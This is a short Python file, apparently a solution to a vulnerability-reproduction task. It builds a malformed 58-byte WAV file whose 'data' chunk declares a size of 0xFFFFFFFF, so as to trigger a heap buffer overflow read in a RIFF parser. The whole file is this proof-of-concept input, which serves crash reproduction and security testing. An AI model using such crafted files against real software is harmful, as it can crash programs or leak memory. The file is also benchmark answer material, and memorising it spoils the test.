import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        The vulnerability occurs when a RIFF sub-chunk size (specifically the 'data' chunk)
        claims to be larger than the enclosing RIFF chunk, leading to out-of-bounds reads.
        """
        
        # Construct a WAV file structure.
        # Target total length: 58 bytes.
        
        # 1. RIFF Chunk Header (12 bytes)
        # 'RIFF'
        # ChunkSize: 50 (Total file size 58 - 8 bytes)
        # Format: 'WAVE'
        riff_chunk = b'RIFF' + struct.pack('<I', 50) + b'WAVE'
        
        # 2. fmt Sub-chunk (24 bytes)
        # 'fmt '
        # Subchunk1Size: 16 (PCM)
        # AudioFormat: 1 (PCM)
        # NumChannels: 1
        # SampleRate: 44100
        # ByteRate: 88200
        # BlockAlign: 2
        # BitsPerSample: 16
        fmt_data = (
            struct.pack('<H', 1) +      # AudioFormat
            struct.pack('<H', 1) +      # NumChannels
            struct.pack('<I', 44100) +  # SampleRate
            struct.pack('<I', 88200) +  # ByteRate
            struct.pack('<H', 2) +      # BlockAlign
            struct.pack('<H', 16)       # BitsPerSample
        )
        fmt_chunk = b'fmt ' + struct.pack('<I', 16) + fmt_data
        
        # 3. data Sub-chunk Header (8 bytes)
        # 'data'
        # Subchunk2Size: 0xFFFFFFFF
        # This large size is the trigger. The parser expects data up to this size,
        # but fails to check it against the RIFF ChunkSize (50), causing it to read
        # past the actual end of the buffer (58 bytes).
        data_header = b'data' + struct.pack('<I', 0xFFFFFFFF)
        
        # 4. Data Content (14 bytes)
        # Fill the remaining space to reach exactly 58 bytes.
        # Current size: 12 + 24 + 8 = 44 bytes.
        # Required: 58 - 44 = 14 bytes.
        padding = b'\x00' * 14
        
        return riff_chunk + fmt_chunk + data_header + padding